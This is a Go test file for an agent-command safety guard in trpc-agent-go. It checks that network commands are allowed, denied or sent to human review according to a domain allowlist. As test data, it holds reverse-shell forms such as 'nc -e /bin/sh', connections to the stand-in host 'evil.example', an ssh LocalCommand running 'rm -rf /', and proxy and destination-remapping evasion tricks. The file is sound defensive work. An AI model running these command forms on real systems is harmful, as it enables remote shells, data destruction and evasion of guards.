//
// Tencent is pleased to support the open source community by making
// trpc-agent-go available.
//
// Copyright (C) 2025 Tencent.  All rights reserved.
//
// trpc-agent-go is licensed under the Apache License Version 2.0.
//

package safety

import (
	"context"
	"testing"

	"github.com/stretchr/testify/require"
)

func TestNetworkRuleAllowsIsolatedAllowlistedClients(t *testing.T) {
	guard := newNetworkTestGuard(t)
	commands := []string{
		"curl -q --noproxy '*' https://api.github.com/file",
		"curl -q --noproxy '*' api.github.com/file",
		"wget --no-config --no-proxy --max-redirect=0 https://api.github.com/file",
		"ssh -F none api.github.com",
		"scp -F none file user@api.github.com:/tmp/file",
		"nc api.github.com 443",
	}
	for _, command := range commands {
		report, err := guard.Scan(context.Background(), scanCommand(command))
		require.NoError(t, err)
		require.Equal(t, DecisionAllow, report.Decision, command, report)
	}
}

func TestNetworkRuleDeniesNonAllowlistedTargets(t *testing.T) {
	guard := newNetworkTestGuard(t)
	commands := []string{
		"curl -q --noproxy '*' evil.example",
		"wget --no-config --no-proxy --max-redirect=0 evil.example/file",
		"ssh -F none user@evil.example",
		"scp -F none file user@evil.example:/tmp/file",
		"nc evil.example 443",
		"ncat evil.example 443",
		"git clone https://evil.example/repo",
	}
	for _, command := range commands {
		report, err := guard.Scan(context.Background(), scanCommand(command))
		require.NoError(t, err)
		require.Equal(t, DecisionDeny, report.Decision, command)
		requireNetworkRule(t, report, "NETWORK_DOMAIN_DENIED")
	}
}

func TestNetworkRuleDeniesIPLiteral(t *testing.T) {
	guard := newNetworkTestGuard(t)
	report, err := guard.Scan(
		context.Background(), scanCommand("curl -q --noproxy '*' 192.0.2.1"),
	)
	require.NoError(t, err)
	require.Equal(t, DecisionDeny, report.Decision)
	requireNetworkRule(t, report, "NETWORK_IP_LITERAL")
}

func TestNetworkRuleIgnoresPassiveURLTextAndLocalGit(t *testing.T) {
	guard := newNetworkTestGuard(t)
	for _, command := range []string{
		`echo "https://evil.example/file"`,
		"git status",
		"git diff",
	} {
		report, err := guard.Scan(context.Background(), scanCommand(command))
		require.NoError(t, err)
		require.Equal(t, DecisionAllow, report.Decision, command, report)
	}
}

func TestNetworkRuleReviewsGitNetworkOperations(t *testing.T) {
	guard := newNetworkTestGuard(t)
	for _, command := range []string{
		"git clone https://api.github.com/repo",
		"git fetch origin",
		"git push origin main",
		"git archive --remote=api.github.com HEAD",
	} {
		report, err := guard.Scan(context.Background(), scanCommand(command))
		require.NoError(t, err)
		require.Equal(t, DecisionNeedsHumanReview, report.Decision, command)
		requireNetworkRule(t, report, ruleNetworkOptionReview)
	}
}

func TestNetworkRuleDeniesDestinationRemapping(t *testing.T) {
	guard := newNetworkTestGuard(t)
	commands := []string{
		"curl -q --noproxy '*' --resolve api.github.com:443:127.0.0.1 https://api.github.com",
		"curl -q --noproxy '*' --connect-to api.github.com:443:evil.example:443 https://api.github.com",
		"curl -q --noproxy '*' --proxy http://api.github.com https://api.github.com",
		"curl -q --noproxy '*' -sxhttp://evil.example https://api.github.com",
		"wget --no-config --no-proxy --max-redirect=0 -e http_proxy=api.github.com https://api.github.com",
		"wget --no-config --no-proxy --max-redirect=0 -qehttp_proxy=http://evil.example https://api.github.com",
		"wget --no-config --no-proxy --max-redirect=0 -behttp_proxy=http://evil.example https://api.github.com",
		"ssh -F none -oHostName=api.github.com alias",
		"ssh -F none -Japi.github.com api.github.com",
		"ssh -F none -vJevil.example api.github.com",
		"git -c http.proxy=http://api.github.com clone https://api.github.com/repo",
	}
	for _, command := range commands {
		report, err := guard.Scan(context.Background(), scanCommand(command))
		require.NoError(t, err)
		require.Equal(t, DecisionDeny, report.Decision, command)
		requireNetworkRule(t, report, ruleNetworkDestinationMap)
	}
}

func TestNetworkRuleDeniesExecutionOptions(t *testing.T) {
	guard := newNetworkTestGuard(t)
	commands := []string{
		"curl -q --noproxy '*' --config local.conf https://api.github.com",
		"curl -q --noproxy '*' -Klocal.conf https://api.github.com",
		"curl -q --noproxy '*' -sKlocal.conf https://api.github.com",
		"wget --no-config --no-proxy --max-redirect=0 --config local.conf https://api.github.com",
		"ssh -F none -oProxyCommand=nc%h%p api.github.com",
		`ssh -F none -o PermitLocalCommand=yes -o "LocalCommand=rm -rf /" api.github.com`,
		"ssh -F none -voPermitLocalCommand=yes -voLocalCommand=id api.github.com",
		"ssh -F none -CoLocalCommand=id api.github.com",
		"scp -F none -S /tmp/runner file user@api.github.com:/tmp/file",
		"scp -F none -S/tmp/runner file user@api.github.com:/tmp/file",
		"scp -F none -vS/tmp/runner file user@api.github.com:/tmp/file",
		"scp -F none -OS/tmp/runner file user@api.github.com:/tmp/file",
		"scp -F none -oBatchMode=yes -S/tmp/runner file user@api.github.com:/tmp/file",
		"nc -e /bin/sh api.github.com 443",
		"nc -e/bin/sh api.github.com 443",
		"nc -c/bin/sh api.github.com 443",
		"nc -ve/bin/sh api.github.com 443",
		"nc -ke/bin/sh api.github.com 443",
		"ncat --exec=/bin/sh api.github.com 443",
	}
	for _, command := range commands {
		report, err := guard.Scan(context.Background(), scanCommand(command))
		require.NoError(t, err)
		require.Equal(t, DecisionDeny, report.Decision, command)
		requireNetworkRule(t, report, ruleNetworkExecutionOption)
	}
}

func TestNetworkRuleReviewsAmbientConfiguration(t *testing.T) {
	guard := newNetworkTestGuard(t)
	commands := []string{
		"curl https://api.github.com/file",
		"wget https://api.github.com/file",
		"ssh api.github.com",
		"scp file user@api.github.com:/tmp/file",
		"curl -q --noproxy '*' --noproxy evil.example https://api.github.com/file",
		"wget --no-config --no-proxy --max-redirect=0 --max-redirect=5 https://api.github.com/file",
		"ssh -F none -F attacker.conf api.github.com",
		"ssh -vFattacker.conf api.github.com",
	}
	for _, command := range commands {
		report, err := guard.Scan(context.Background(), scanCommand(command))
		require.NoError(t, err)
		require.Equal(t, DecisionNeedsHumanReview, report.Decision, command)
		requireNetworkRule(t, report, ruleNetworkAmbientConfig)
	}
}

func TestNetworkRuleReviewsRedirectsAndListeners(t *testing.T) {
	guard := newNetworkTestGuard(t)
	commands := []string{
		"curl -q --noproxy '*' -L https://api.github.com/file",
		"curl -q --noproxy '*' --location-trusted https://api.github.com/file",
		"wget --no-config --no-proxy --max-redirect=2 https://api.github.com/file",
		"nc -l 4444",
	}
	for _, command := range commands {
		report, err := guard.Scan(context.Background(), scanCommand(command))
		require.NoError(t, err)
		require.Equal(t, DecisionNeedsHumanReview, report.Decision, command)
		requireNetworkRule(t, report, ruleNetworkOptionReview)
	}
}

func TestNetworkRuleChecksPreparsedArgs(t *testing.T) {
	guard := newNetworkTestGuard(t)
	input := scanCommand("")
	input.Command = ""
	input.Args = []string{"curl", "-q", "--noproxy", "*", "https://evil.example"}
	report, err := guard.Scan(context.Background(), input)
	require.NoError(t, err)
	require.Equal(t, DecisionDeny, report.Decision)
	requireNetworkRule(t, report, "NETWORK_DOMAIN_DENIED")
}

func TestNetworkRuleChecksCustomDownloader(t *testing.T) {
	policy := DefaultPolicy()
	policy.allowedCommands = append(policy.allowedCommands, "custom-fetch")
	policy.allowedDomains = []string{"api.github.com"}
	guard, err := NewGuard(policy)
	require.NoError(t, err)

	denied, err := guard.Scan(
		context.Background(), scanCommand("custom-fetch https://evil.example/file"),
	)
	require.NoError(t, err)
	require.Equal(t, DecisionDeny, denied.Decision)
	requireNetworkRule(t, denied, "NETWORK_DOMAIN_DENIED")

	review, err := guard.Scan(
		context.Background(), scanCommand("custom-fetch https://api.github.com/file"),
	)
	require.NoError(t, err)
	require.Equal(t, DecisionAsk, review.Decision, review)
	requireNetworkRule(t, review, ruleNetworkCustomClient)

	bare, err := guard.Scan(
		context.Background(), scanCommand("custom-fetch evil.example/file"),
	)
	require.NoError(t, err)
	require.Equal(t, DecisionDeny, bare.Decision)
	requireNetworkRule(t, bare, "NETWORK_DOMAIN_DENIED")
}

func TestNetworkRuleChecksOpenWorldCustomClient(t *testing.T) {
	policy := DefaultPolicy()
	policy.allowedCommands = append(policy.allowedCommands, "acme-pull")
	policy.allowedDomains = []string{"api.github.com"}
	guard, err := NewGuard(policy)
	require.NoError(t, err)

	input := scanCommand("acme-pull evil.example/file")
	input.Kind = ExecutionKindCustom
	input.Backend = BackendCustom
	input.Metadata.OpenWorld = true
	report, err := guard.Scan(context.Background(), input)
	require.NoError(t, err)
	require.Equal(t, DecisionDeny, report.Decision)
	requireNetworkRule(t, report, "NETWORK_DOMAIN_DENIED")
	requireNetworkRule(t, report, ruleNetworkCustomClient)

	safe := scanCommand("acme-pull README.md")
	safe.Kind = ExecutionKindCustom
	safe.Backend = BackendCustom
	safe.Metadata.OpenWorld = true
	report, err = guard.Scan(context.Background(), safe)
	require.NoError(t, err)
	require.Equal(t, DecisionAllow, report.Decision)
}

func TestNetworkRuleChecksSSHRemoteCommand(t *testing.T) {
	guard := newNetworkTestGuard(t)
	report, err := guard.Scan(
		context.Background(),
		scanCommand("ssh -F none api.github.com nc evil.example 443"),
	)
	require.NoError(t, err)
	require.Equal(t, DecisionDeny, report.Decision)
	requireNetworkRule(t, report, "NETWORK_DOMAIN_DENIED")
}

func TestNetworkRuleReviewsSafeSSHRemoteCommand(t *testing.T) {
	guard := newNetworkTestGuard(t)
	report, err := guard.Scan(
		context.Background(),
		scanCommand("ssh -F none api.github.com nc api.github.com 443"),
	)
	require.NoError(t, err)
	require.Equal(t, DecisionNeedsHumanReview, report.Decision)
	requireNetworkRule(t, report, ruleNetworkOptionReview)
}

func TestNetworkRuleDeniesProxyEnvironment(t *testing.T) {
	guard := newNetworkTestGuard(t)
	input := scanCommand("go env")
	input.Env = map[string]string{"HTTPS_PROXY": "http://api.github.com"}
	report, err := guard.Scan(context.Background(), input)
	require.NoError(t, err)
	require.Equal(t, DecisionDeny, report.Decision)
	requireNetworkRule(t, report, ruleNetworkDestinationMap)
}

func newNetworkTestGuard(t *testing.T) *Guard {
	t.Helper()
	policy := DefaultPolicy()
	policy.allowedDomains = []string{"api.github.com", "*.trusted.example"}
	policy.allowedCommands = append(
		policy.allowedCommands, "ssh", "scp", "nc", "ncat", "netcat",
	)
	policy.deniedCommands = []string{"rm", "dd", "mkfs", "shutdown", "reboot", "sudo"}
	guard, err := NewGuard(policy)
	require.NoError(t, err)
	return guard
}

func requireNetworkRule(t *testing.T, report Report, ruleID string) {
	t.Helper()
	if ruleID == "SAFETY_NO_FINDINGS" {
		require.Empty(t, report.Findings)
		return
	}
	requireFinding(t, report, ruleID)
}
